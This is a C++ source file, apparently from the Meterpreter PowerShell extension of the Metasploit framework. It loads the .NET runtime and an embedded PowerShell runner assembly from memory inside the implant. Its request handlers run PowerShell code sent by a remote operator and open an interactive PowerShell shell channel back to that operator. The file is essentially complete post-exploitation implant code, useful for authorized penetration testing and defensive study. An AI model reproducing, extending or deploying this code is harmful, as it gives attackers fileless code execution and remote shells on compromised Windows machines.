/*!
 * @file powershell_bridge.c
 * @brief Wrapper functions for bridging native meterp calls to powershell
 */
extern "C" {
#include "../../common/common.h"
#include "powershell.h"
#include "powershell_bridge.h"
}

#include <comdef.h>
#include <mscoree.h>
#include <metahost.h>
#include "powershell_runner.h"

typedef struct _InteractiveShell
{
	HANDLE wait_handle;
	_bstr_t output;
} InteractiveShell;

#define SAFE_RELEASE(x) if((x) != NULL) { (x)->Release(); x = NULL; }

#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;

static ICLRMetaHost* gClrMetaHost = NULL;
static ICLRRuntimeInfo* gClrRuntimeInfo = NULL;
static ICorRuntimeHost* gClrCorRuntimeHost = NULL;
static IUnknownPtr gClrAppDomain = NULL;
static _AppDomainPtr gClrAppDomainInterface = NULL;
static _AssemblyPtr gClrPowershellAssembly = NULL;
static _TypePtr gClrPowershellType = NULL;

DWORD InvokePowershellMethod(_TypePtr spType, wchar_t* method, wchar_t* command, _bstr_t& output)
{
	HRESULT hr;
	bstr_t bstrStaticMethodName(method);
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtStringArg(command);
	variant_t vtPSInvokeReturnVal;
	variant_t vtEmpty;
	LONG index = 0;

	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	do
	{
		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg);
		if (FAILED(hr))
		{
			dprintf("[PSH] failed to prepare arguments: 0x%x", hr);
			break;
		}

		// Invoke the method from the Type interface.
		hr = spType->InvokeMember_3(
			bstrStaticMethodName,
			static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
			NULL,
			vtEmpty,
			psaStaticMethodArgs,
			&vtPSInvokeReturnVal);

		if (FAILED(hr))
		{
			dprintf("[PSH] failed to invoke powershell function", hr);
			break;
		}
		output = vtPSInvokeReturnVal.bstrVal;
	} while (0);

	if (psaStaticMethodArgs != NULL)
	{
		SafeArrayDestroy(psaStaticMethodArgs);
	}

	if (SUCCEEDED(S_OK))
	{
		return ERROR_SUCCESS;
	}

	return (DWORD)hr;
}

DWORD initialize_dotnet_host()
{
	HRESULT hr = S_OK;
	ICLRMetaHost* clrMetaHost = NULL;
	ICLRRuntimeInfo* clrRuntimeInfo = NULL;
	ICorRuntimeHost* clrCorRuntimeHost = NULL;
	IUnknownPtr clrAppDomain = NULL;
	_AppDomainPtr clrAppDomainInterface = NULL;
	_AssemblyPtr clrPowershellAssembly = NULL;
	_TypePtr clrPowershellType = NULL;
	SAFEARRAY* clrByteArray = NULL;

	do
	{
		dprintf("[PSH] Creating the metahost instance");
		if (FAILED(hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&clrMetaHost))))
		{
			dprintf("[PSH] Failed to create instace of the CLR metahost 0x%x", hr);
			break;
		}

		dprintf("[PSH] Getting a reference to the .NET runtime");
		if (FAILED(hr = clrMetaHost->GetRuntime(L"v2.0.50727", IID_PPV_ARGS(&clrRuntimeInfo))))
		{
			dprintf("[PSH] Failed to get runtime instance 0x%x", hr);
			break;
		}

		dprintf("[PSH] Determining loadablility");
		BOOL loadable = FALSE;
		if (FAILED(hr = clrRuntimeInfo->IsLoadable(&loadable)))
		{
			dprintf("[PSH] Unable to determine of runtime is loadable 0x%x", hr);
			break;
		}

		if (!loadable)
		{
			dprintf("[PSH] Chosen runtime isn't loadable, exiting.");
			break;
		}

		dprintf("[PSH] Instantiating the COR runtime host");
		hr = clrRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&clrCorRuntimeHost));
		if (FAILED(hr))
		{
			dprintf("[PSH] Unable to get a reference to the COR runtime host 0x%x", hr);
			break;
		}

		dprintf("[PSH] Starting the COR runtime host");
		if (FAILED(hr = clrCorRuntimeHost->Start()))
		{
			dprintf("[PSH] Unable to start the COR runtime host 0x%x", hr);
			break;
		}

		dprintf("[PSH] Getting a ref to the app domain");
		if (FAILED(hr = clrCorRuntimeHost->GetDefaultDomain(&clrAppDomain)))
		{
			dprintf("[PSH] Unable to get the app domain 0x%x", hr);
			break;
		}

		dprintf("[PSH] Getting a ref to the app domain interface");
		if (FAILED(hr = clrAppDomain->QueryInterface(IID_PPV_ARGS(&clrAppDomainInterface))))
		{
			dprintf("[PSH] Unable to get the app domain interface 0x%x", hr);
			break;
		}

		dprintf("[PSH] CLR app domain ready to run, now loading the powershell runner");
		SAFEARRAYBOUND bounds[1];
		bounds[0].cElements = PSHRUNNER_DLL_LEN;
		bounds[0].lLbound = 0;

		clrByteArray = SafeArrayCreate(VT_UI1, 1, bounds);
		if (clrByteArray == NULL)
		{
			dprintf("[PSH] Failed to create a usable safe array");
			hr = ERROR_OUTOFMEMORY;
			break;
		}

		if (FAILED(hr = SafeArrayLock(clrByteArray)))
		{
			dprintf("[PSH] Safe array lock failed 0x%x", hr);
			break;
		}
		memcpy(clrByteArray->pvData, PowerShellRunnerDll, PSHRUNNER_DLL_LEN);
		SafeArrayUnlock(clrByteArray);

		if (FAILED(hr = clrAppDomainInterface->Load_3(clrByteArray, &clrPowershellAssembly)))
		{
			dprintf("[PSH] Failed to load the powershell runner assembly 0x%x", hr);
			break;
		}

		dprintf("[PSH] Loading the type from memory");
		_bstr_t pshClassName("PowerShellRunner.PowerShellRunner");
		if (FAILED(hr = clrPowershellAssembly->GetType_2(pshClassName, &clrPowershellType)))
		{
			dprintf("[PSH] Unable to locate the powershell class type 0x%x", hr);
			break;
		}

		dprintf("[PSH] Runtime has been initialized successfully");
	} while(0);

	if (clrByteArray != NULL)
	{
		SafeArrayDestroy(clrByteArray);
	}

	if (FAILED(hr))
	{
		SAFE_RELEASE(clrPowershellAssembly);
		SAFE_RELEASE(clrAppDomainInterface);
		SAFE_RELEASE(clrCorRuntimeHost);
		SAFE_RELEASE(clrRuntimeInfo);
		SAFE_RELEASE(clrMetaHost);
		return (DWORD)hr;
	}

	gClrMetaHost = clrMetaHost;
	gClrRuntimeInfo = clrRuntimeInfo;
	gClrCorRuntimeHost = clrCorRuntimeHost;
	gClrAppDomainInterface = clrAppDomainInterface;
	gClrAppDomain = clrAppDomain;
	gClrPowershellAssembly = clrPowershellAssembly;
	gClrPowershellType = clrPowershellType;
	return ERROR_SUCCESS;
}

VOID deinitialize_dotnet_host()
{
	dprintf("[PSH] Cleaning up the .NET/PSH runtime.");
	SAFE_RELEASE(gClrPowershellType);
	SAFE_RELEASE(gClrPowershellAssembly);
	SAFE_RELEASE(gClrAppDomainInterface);
	SAFE_RELEASE(gClrCorRuntimeHost);
	SAFE_RELEASE(gClrRuntimeInfo);
	SAFE_RELEASE(gClrMetaHost);
}

DWORD powershell_channel_interact_notify(Remote *remote, LPVOID entryContext, LPVOID threadContext)
{
	Channel *channel = (Channel*)entryContext;
	InteractiveShell* shell = (InteractiveShell*)threadContext;
	DWORD byteCount = shell->output.length() + 1;

	if (shell->output.length() > 1)
	{
		DWORD result = channel_write(channel, remote, NULL, 0, (PUCHAR)(char*)shell->output, byteCount, NULL);
		shell->output = "";
		ResetEvent(shell->wait_handle);
	}

	return ERROR_SUCCESS;
}

DWORD powershell_channel_interact_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext)
{
	dprintf("[PSH SHELL] finalising interaction");
	InteractiveShell* shell = (InteractiveShell*)threadContext;
	if (shell->wait_handle)
	{
		CloseHandle(shell->wait_handle);
		shell->wait_handle = NULL;
	}
	return ERROR_SUCCESS;
}

DWORD powershell_channel_interact(Channel *channel, Packet *request, LPVOID context, BOOLEAN interact)
{
	DWORD result = ERROR_SUCCESS;
	InteractiveShell* shell = (InteractiveShell*)context;
	if (interact)
	{
		if (shell->wait_handle == NULL)
		{
			dprintf("[PSH SHELL] beginning interaction");
			shell->wait_handle = CreateEventA(NULL, FALSE, FALSE, NULL);

			result = scheduler_insert_waitable(shell->wait_handle, channel, context,
				powershell_channel_interact_notify, powershell_channel_interact_destroy);

			SetEvent(shell->wait_handle);
		}
		else
		{
			dprintf("[PSH SHELL] resuming interaction");
			result = scheduler_signal_waitable(shell->wait_handle, Resume);
			SetEvent(shell->wait_handle);
		}
	}
	else
	{
		dprintf("[PSH SHELL] pausing interaction");
		result = scheduler_signal_waitable(shell->wait_handle, Pause);
	}

	return result;
}

DWORD powershell_channel_write(Channel* channel, Packet* request, LPVOID context,
	LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
{
	InteractiveShell* shell = (InteractiveShell*)context;

	_bstr_t codeMarshall((char*)buffer);
	dprintf("[PSH SHELL] executing command: %s", (char*)codeMarshall);

	_bstr_t output;

	DWORD result = InvokePowershellMethod(gClrPowershellType, L"InvokePS", codeMarshall, output);
	if (result == ERROR_SUCCESS)
	{
		shell->output += output + "PS > ";
		SetEvent(shell->wait_handle);
	}
	return result;
}

DWORD powershell_channel_close(Channel* channel, Packet* request, LPVOID context)
{
	dprintf("[PSH SHELL] closing channel");
	InteractiveShell* shell = (InteractiveShell*)context;
	if (shell->wait_handle != NULL)
	{
		CloseHandle(shell->wait_handle);
	}
	free(shell);
	return ERROR_SUCCESS;
}

/*!
 * @brief Start an interactive powershell session.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_powershell_shell(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	InteractiveShell* shell = NULL;

	if (response)
	{
		do
		{
			PoolChannelOps chanOps = { 0 };
			shell = (InteractiveShell*)calloc(1, sizeof(InteractiveShell));

			if (shell == NULL)
			{
				dprintf("[PSH] Failed to allocated memory");
				dwResult = ERROR_OUTOFMEMORY;
				break;
			}

			chanOps.native.context = shell;
			chanOps.native.close = powershell_channel_close;
			chanOps.native.write = powershell_channel_write;
			chanOps.native.interact = powershell_channel_interact;
			shell->output = "PS > ";
			Channel* newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chanOps);

			channel_set_type(newChannel, "psh");
			packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
		} while (0);

		packet_transmit_response(dwResult, remote, response);
	}

	if (dwResult != ERROR_SUCCESS)
	{
		SAFE_FREE(shell);
	}

	return dwResult;
}

/*!
 * @brief Handle the request for powershell execution.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_powershell_execute(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);

	if (response)
	{
		char* code = packet_get_tlv_value_string(packet, TLV_TYPE_POWERSHELL_CODE);
		if (code != NULL)
		{
			_bstr_t codeMarshall(code);
			_bstr_t output;

			dwResult = InvokePowershellMethod(gClrPowershellType, L"InvokePS", codeMarshall, output);
			if (dwResult == ERROR_SUCCESS)
			{
				packet_add_tlv_string(response, TLV_TYPE_POWERSHELL_RESULT, output);
			}
		}
		else
		{
			dprintf("[PSH] Code parameter missing from call");
			dwResult = ERROR_INVALID_PARAMETER;
		}
		packet_transmit_response(dwResult, remote, response);
	}

	return dwResult;
}
